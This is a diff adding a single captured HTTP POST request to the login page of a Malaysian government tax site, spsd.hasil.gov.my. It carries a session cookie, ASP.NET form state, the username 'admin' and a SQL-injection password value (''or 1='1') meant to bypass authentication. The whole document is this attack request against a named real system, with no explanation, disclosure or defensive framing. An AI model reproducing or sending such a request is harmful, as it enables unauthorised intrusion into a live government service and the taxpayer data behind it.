@@ -1,0 +1,13 @@
+POST https://spsd.hasil.gov.my/LogMasuk.aspx?ReturnUrl=%2fLamanUtama.aspx
+Host: spsd.hasil.gov.my
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/23.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://spsd.hasil.gov.my/LogMasuk.aspx?ReturnUrl=%2fLamanUtama.aspx
+Cookie: ASP.NET_SessionId=dgecpg455ztgbd55oavgry2n
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 983
+
+ctl00_trvMenu_ExpandState=n&ctl00_trvMenu_SelectedNode=&__EVENTTARGET=&__EVENTARGUMENT=&ctl00_trvMenu_PopulateLog=&__VIEWSTATE=%2FwEPDwULLTExMDc4NzU4MzQPZBYCZg9kFgICAw9kFgQCEw88KwAJAgAPFggeDFNlbGVjdGVkTm9kZWQeDU5ldmVyRXhwYW5kZWRkHgtfIURhdGFCb3VuZGceCUxhc3RJbmRleAIBZAgUKwACBQMwOjAUKwACFgweBFRleHQFC0xhbWFuIFV0YW1hHgVWYWx1ZQULTGFtYW4gVXRhbWEeDFNlbGVjdEFjdGlvbgsqLlN5c3RlbS5XZWIuVUkuV2ViQ29udHJvbHMuVHJlZU5vZGVTZWxlY3RBY3Rpb24DHghEYXRhUGF0aAUkNmI0YTdkYzMtMzkxOS00YmZhLThiZjUtYTM2YTBiZDM4YWQ5HglEYXRhQm91bmRnHghFeHBhbmRlZGdkZAIbDw8WAh8EBQI1NWRkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYDBQ1jdGwwMCR0cnZNZW51BRhjdGwwMCRMb2dpblN0YXR1czEkY3RsMDEFGGN0bDAwJExvZ2luU3RhdHVzMSRjdGwwM84KCeT813iwhoB3eseRQ4MgJ3Dr&__EVENTVALIDATION=%2FwEWBQKRxbhyAuHy%2BZMIAr%2FVhPMNAu7wj%2FQOAsz3upgF%2BY1QfQ2yLG7zmUOevzReyyX4o78%3D&ctl00%24ContentPlaceHolder1%24Login1%24UserName=admin&ctl00%24ContentPlaceHolder1%24Login1%24Password=%27or+1%3D%271&ctl00%24ContentPlaceHolder1%24Login1%24LoginButton=Hantar
